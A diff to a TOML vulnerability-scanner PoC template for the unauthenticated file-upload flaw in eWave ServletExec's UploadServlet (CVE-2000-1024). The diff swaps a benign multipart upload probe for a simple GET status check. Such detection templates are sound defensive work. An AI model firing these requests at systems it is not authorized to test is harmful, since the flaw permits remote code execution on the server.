@@ -1,53 +1,22 @@
 [info]
-author = "AVE"
-description = "检测 eWave ServletExec 3.0C 及更早版本中 UploadServlet 是否可被未授权访问。攻击者可通过 GET 请求直接调用 /servlet/com.unify.ewave.servletexec.UploadServlet，若返回 200 状态码则说明 servlet 可访问，存在文件上传导致远程代码执行的风险。"
+author = "ave"
+description = "验证 eWave ServletExec UploadServlet 是否存在未授权访问漏洞。通过发送 HTTP GET 请求检查 UploadServlet 是否可在无需身份认证的情况下访问，若返回 200 状态码则说明存在未授权文件上传漏洞，攻击者可通过上传恶意文件实现远程代码执行。"
 id = "POC-AVE-2000-1908"
-name = "eWave ServletExec UploadServlet 未授权访问检测 PoC"
+name = "eWave ServletExec 未授权文件上传远程代码执行漏洞 PoC"
 severity = "critical"
-tags = [
-    "cve-2000-1024",
-    "servletexec",
-    "file-upload",
-]
+tags = ["ave-2000-1908"]
 vuln_id = [
     "CVE-2000-1024",
     "AVE-2000-1908",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/servlet/com.unify.ewave.servletexec.UploadServlet"
+path = "/{{BaseURL}}/servlet/UploadServlet"
 protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
-
-[[poc.requests]]
-method = "POST"
-path = "/{{BaseURL}}/servlet/com.unify.ewave.servletexec.UploadServlet"
-protocol = "http"
-
-[poc.requests.body]
-content = """
-------AVE\r
-Content-Disposition: form-data; name="uploadDir"\r
-\r
-/webapps/\r
-------AVE\r
-Content-Disposition: form-data; name="File1"; filename="test.txt"\r
-\r
-AVE PoC test\r
-------AVE--\r
-"""
-type = "raw"
-
-[poc.requests.headers]
-Content-Type = "multipart/form-data; boundary=----AVE"
 
 [[poc.requests.matchers]]
 expect = true
